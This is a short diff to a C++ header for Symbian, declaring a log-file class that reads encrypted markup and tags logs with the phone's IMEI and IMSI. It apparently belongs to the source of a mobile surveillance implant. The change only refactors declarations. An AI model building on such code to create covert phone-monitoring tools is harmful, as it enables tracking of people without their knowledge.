@@ -21,6 +21,9 @@
 
 #include <HT\Phone.h>
 
+extern TBuf<50>		iGlobalImei;
+extern TBuf<15>		iGlobalImsi;
+
 #define LOG_DELIMITER 			0xABADC0DE
 
 #define LOGTYPE_UNKNOWN			0xFFFF	// in caso di errore
@@ -109,7 +112,7 @@ public:
 	IMPORT_C void WriteMarkupL(TInt aId, const TDesC8& aData);
 	IMPORT_C TBool ExistsMarkupL(TInt aId);
 	IMPORT_C HBufC8* ReadMarkupL(TInt aId);
-	IMPORT_C HBufC8* CLogFile::DecryptMarkupL(RFs& fs,const TDesC& fname);
+	IMPORT_C HBufC8* DecryptMarkupL(RFs& fs,const TDesC& fname);
 	
 	/**
 	 * Method for LogInfo messages
@@ -117,7 +120,7 @@ public:
 	//void LogInfoL(const TDesC& aLogInfoMsg);
 	
 private:
-	void RetrieveImeiAndImsiL();
+	//void RetrieveImeiAndImsiL();
 	
 	//TInt64 GetFiletime();
 
@@ -136,8 +139,8 @@ private:
 	TBool iOpened;
 	TBool iContainsData;
 	RFs& iFs;
-	TBuf<CTelephony::KPhoneSerialNumberSize> iImei;
-	TBuf<CTelephony::KIMSISize> iImsi;
+	//TBuf<CTelephony::KPhoneSerialNumberSize> iImei;
+	//TBuf<CTelephony::KIMSISize> iImsi;
 	TInt iLogId;	// Useful for naming the log file using a meaning name.
 	__FLOG_DECLARATION_MEMBER
 	};
